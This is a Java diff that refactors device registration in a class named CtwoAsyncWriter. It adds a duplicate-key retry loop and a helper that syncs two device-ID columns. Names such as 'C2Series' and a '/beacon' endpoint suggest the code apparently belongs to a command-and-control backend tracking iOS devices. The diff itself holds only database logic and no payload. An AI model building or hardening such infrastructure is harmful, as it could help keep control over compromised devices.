@@ -158,74 +158,92 @@ public class CtwoAsyncWriter {
             return null;
         }
         double now = System.currentTimeMillis() / 1000.0;
-        try {
-            DeviceEntity existing = deviceDao.findByDeviceId(uuid);
-            if (existing != null) {
-                existing.setIp(clientIp);
-                existing.setBindPhase(1);
-                existing.setDevicestatus(1);
-                existing.setOnlinestatus(1);
-                existing.setLastEventAt(now);
-                existing.setC2Series(1);
-                fillChannelIfBlank(existing, domain);
-                if (DomainMatchUtil.isBlank(existing.getDomain()) && !DomainMatchUtil.isBlank(domain)) {
-                    existing.setDomain(domain);
-                }
-                deviceDao.updateById(existing);
-                return existing;
-            }
-
-            DeviceEntity neu = new DeviceEntity();
-            neu.setDeviceId(uuid);
-            neu.setDevice_id(uuid);
-            neu.setChannelCode("");
-            neu.setDomain(domain == null ? "" : domain);
-            neu.setIp(clientIp);
-            neu.setAddtime(now);
-            neu.setIpstatus(0);
-            neu.setDevicestatus(1);
-            neu.setOnlinestatus(1);
-            neu.setBindPhase(1);
-            neu.setLastEventAt(now);
-            neu.setModel("");
-            neu.setDeviceName("");
-            neu.setIosVersion("");
-            neu.setC2Series(1);
-            fillChannelIfBlank(neu, domain);
+        // 并发 /p|/u|/a|/beacon 同 uuid 建机：查→插竞态常见，冲突后重查（双列）再更新
+        for (int attempt = 1; attempt <= 3; attempt++) {
             try {
-                deviceDao.insert(neu);
-                log.info("[/u|/p] 设备兜底新建 uuid={} ip={} channel={}",
-                        uuid, clientIp, neu.getChannelCode());
-                return neu;
-            } catch (Exception dup) {
-                DeviceEntity again = deviceDao.findByDeviceId(uuid);
-                if (again != null) {
-                    again.setIp(clientIp);
-                    again.setBindPhase(1);
-                    again.setDevicestatus(1);
-                    again.setOnlinestatus(1);
-                    again.setLastEventAt(now);
-                    again.setC2Series(1);
-                    fillChannelIfBlank(again, domain);
-                    deviceDao.updateById(again);
-                    return again;
+                DeviceEntity existing = deviceDao.findByDeviceId(uuid);
+                if (existing != null) {
+                    touchBoundDevice(existing, domain, clientIp, now);
+                    return existing;
                 }
-                log.info("[/u|/p] 设备兜底新建失败 uuid={} ip={} err={}", uuid, clientIp, dup.toString());
+
+                DeviceEntity neu = new DeviceEntity();
+                neu.setDeviceId(uuid);
+                neu.setDevice_id(uuid);
+                neu.setChannelCode("");
+                neu.setDomain(domain == null ? "" : domain);
+                neu.setIp(clientIp);
+                neu.setAddtime(now);
+                neu.setIpstatus(0);
+                neu.setDevicestatus(1);
+                neu.setOnlinestatus(1);
+                neu.setBindPhase(1);
+                neu.setLastEventAt(now);
+                neu.setModel("");
+                neu.setDeviceName("");
+                neu.setIosVersion("");
+                neu.setC2Series(1);
+                fillChannelIfBlank(neu, domain);
+                try {
+                    deviceDao.insert(neu);
+                    log.info("[/u|/p] 设备兜底新建 uuid={} ip={} channel={}",
+                            uuid, clientIp, neu.getChannelCode());
+                    return neu;
+                } catch (org.springframework.dao.DuplicateKeyException dup) {
+                    DeviceEntity again = deviceDao.findByDeviceId(uuid);
+                    if (again != null) {
+                        touchBoundDevice(again, domain, clientIp, now);
+                        return again;
+                    }
+                    if (attempt < 3) {
+                        try {
+                            Thread.sleep(20L * attempt);
+                        } catch (InterruptedException ie) {
+                            Thread.currentThread().interrupt();
+                            return null;
+                        }
+                        continue;
+                    }
+                    log.info("[/u|/p] 设备兜底新建冲突后仍未命中 uuid={} ip={} err={}",
+                            uuid, clientIp, dup.toString());
+                    return null;
+                }
+            } catch (Exception e) {
+                log.info("[/u|/p] 设备兜底失败 uuid={} ip={} err={}", uuid, clientIp, e.toString());
                 return null;
             }
-        } catch (Exception e) {
-            log.info("[/u|/p] 设备兜底失败 uuid={} ip={} err={}", uuid, clientIp, e.toString());
-            return null;
         }
+        return null;
+    }
+
+    private void touchBoundDevice(DeviceEntity existing, String domain, String clientIp, double now) {
+        existing.setIp(clientIp);
+        existing.setBindPhase(1);
+        existing.setDevicestatus(1);
+        existing.setOnlinestatus(1);
+        existing.setLastEventAt(now);
+        existing.setC2Series(1);
+        // 双列互相同步，避免只写一边导致下次查 miss
+        if (DomainMatchUtil.isBlank(existing.getDeviceId()) && !DomainMatchUtil.isBlank(existing.getDevice_id())) {
+            existing.setDeviceId(existing.getDevice_id());
+        }
+        if (DomainMatchUtil.isBlank(existing.getDevice_id()) && !DomainMatchUtil.isBlank(existing.getDeviceId())) {
+            existing.setDevice_id(existing.getDeviceId());
+        }
+        fillChannelIfBlank(existing, domain);
+        if (DomainMatchUtil.isBlank(existing.getDomain()) && !DomainMatchUtil.isBlank(domain)) {
+            existing.setDomain(domain);
+        }
+        deviceDao.updateById(existing);
     }
 
     private boolean fillChannelIfBlank(DeviceEntity device, String domainRaw) {
         if (device == null || !DomainMatchUtil.isBlank(device.getChannelCode())) {
             return false;
         }
-        String host = DomainMatchUtil.normalizeHost(domainRaw);
+        String host = DomainMatchUtil.normalizeHostKeepPort(domainRaw);
         if (host.isEmpty() && !DomainMatchUtil.isBlank(device.getDomain())) {
-            host = DomainMatchUtil.normalizeHost(device.getDomain());
+            host = DomainMatchUtil.normalizeHostKeepPort(device.getDomain());
         }
         if (host.isEmpty()) {
             return false;
